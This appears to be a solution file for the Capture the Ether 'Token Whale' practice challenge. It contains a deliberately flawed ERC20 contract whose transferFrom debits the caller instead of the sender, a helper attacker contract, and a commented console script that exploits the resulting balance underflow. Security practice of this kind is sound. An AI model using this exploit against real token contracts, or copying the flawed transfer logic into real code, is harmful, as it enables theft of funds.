pragma solidity ^0.4.21;

import './OtherContract.sol';

/*
var tokenWhaleChallenge = await TokenWhaleChallenge.deployed();
var tokenWhaleHelper = await TokenWhaleHelper.deployed();
await tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)
await tokenWhaleHelper.steal()

tokenWhaleChallenge.balanceOf(accounts[0])
tokenWhaleChallenge.approve(accounts[0], 1000000000000)
tokenWhaleChallenge.transferFrom(accounts[0], tokenWhaleHelper.address, 500)
tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)

tokenWhaleHelper.approve(tokenWhaleHelper.address, 1000000000000)
await tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)



var tokenWhaleChallenge = await TokenWhaleChallenge.deployed();
var tokenWhaleHelper = await TokenWhaleHelper.deployed();
(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber();
(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toNumber()
await tokenWhaleChallenge.approve(tokenWhaleHelper.address, 1000000000000)
await tokenWhaleHelper.transferFrom(accounts[0], accounts[0], 1)
await tokenWhaleHelper.approve(tokenWhaleHelper.address, 9999999999)
await tokenWhaleHelper.transferFrom(tokenWhaleHelper.address, accounts[0], 9999999999)
(await tokenWhaleChallenge.balanceOf(accounts[0])).toNumber()
(await tokenWhaleChallenge.balanceOf(tokenWhaleHelper.address)).toString()
await tokenWhaleChallenge.isComplete()
*/

contract TokenWhaleHelper is OtherContract {
    function() public payable { 
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function getBalance(address requested) public view returns (uint256) {
        require(otherContract != 0);
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
        return tokenWhaleChallenge.balanceOf(requested);
    }

    function isComplete() public view returns (bool) {
        require(otherContract != 0);
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
        return tokenWhaleChallenge.isComplete();
    }

    function approve(address spender, uint256 value) public {
        require(otherContract != 0);
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
        tokenWhaleChallenge.approve(spender, value);
    }

    function transfer(address to, uint256 value) public {
        require(otherContract != 0);
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
        tokenWhaleChallenge.transfer(to, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(otherContract != 0);
        TokenWhaleChallenge tokenWhaleChallenge = TokenWhaleChallenge(otherContract);
        tokenWhaleChallenge.transferFrom(from, to, value);
    }
}

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}
